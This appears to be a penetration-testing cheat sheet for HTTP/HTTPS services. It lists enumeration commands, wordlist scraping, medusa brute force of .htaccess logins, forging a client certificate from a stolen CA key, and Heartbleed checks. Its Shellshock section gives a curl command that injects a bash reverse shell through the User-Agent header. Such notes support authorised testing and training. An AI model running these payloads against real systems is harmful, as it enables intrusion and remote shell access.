# TCP 80/443: HTTP(S)

> The Hypertext Transfer Protocol is an application protocol for distributed, collaborative, hypermedia information systems.  
>
>  -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol)</cite>

## Related

[Enumeration/Webserver scanning](../../02-enumeration/03-webserver-scanning.md)

## Information gathering

### 443/https

-> Check SSL certificate for **hostnames** and **email addresses**

### General

Check headers
```bash
curl -i <ip>
```

Follow redirection
```bash
curl -i -L <ip>
```

Check links
```bash
curl <ip> -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
```

Identify technologies used
```bash
whatweb <ip>
```

Get response
```bash
http <ip>
```

Terminal/Text-based browsers
```bash
browsh --startup-url <url>
```

```bash
lynx <url>
```

### URL brute force

See [Enumeration/Webserver scanning](../../02-enumeration/03-webserver-scanning.md)

### Scrape website 

Scrapes a website to generate password list from words, found there
```bash
cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
```
-> Mutate list using [John the Ripper (JTR)](../../03-exploitation/02-passwords/02-john-the-ripper.md)

## .htaccess

Brute force
```bash
medusa -h <ip> -u <user> -P <wordlist-file> -M http -m DIR:/admin -T 10
```

## Sign SSL certificate

* Got private key from vsftpd backdoor php shell (`ca.key`)  
* Export certificate from Firefox (`ca.crt`)

```bash
openssl pkey -in ca.key -pubout
openssl x509 -in ca.crt -pubkey -noout

openssl genrsa -out client.key 4096
openssl req -new -key client.key -out client.csr
openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -set_serial 9001 -extensions client -days 9002 -outform PEM -out client.cer
openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
openssl verify -verbose -CAfile ca.crt client.cer
```

-> Firefox -> Preferences -> Search certificates -> Import "client.p12", Import "ca.crt" (trust)  

### Troubleshooting

* No permission to file, but to folder? -> re-create file!

## Heartbleed

### Check

```bash
sslscan <ip>
```

```bash
sslyze --heartbleed <ip>
```

```bash
nmap -sV --script=ssl-heartbleed -oA nmap_heartbleed <ip>
```

### Exploits

* [How to Exploit the Heartbleed Bug](https://stackabuse.com/how-to-exploit-the-heartbleed-bug/)
* [GitHub - sensepost/heartbleed-poc: Test for SSL heartbeat vulnerability (CVE-2014-0160)](https://github.com/sensepost/heartbleed-poc)

## Shellshock

Check
```bash
nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi <ip>
```

Exploit
```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1" http://<ip>/cgi-bin/admin.cgi
```

## Apache2

Debian: `/etc/apache2/`  
CentOS: `/etc/httpd/`  

Interesting files:  
```bash
./apache2.conf
./ports.conf
./envvars
./access.log
./error.log
/etc/logrotate.d/apache2
```

Find document root:
```bash
grep -Ri DocumentRoot .
```

```bash
grep -R '$bigtree\["config"\]\["db"\]' .
```
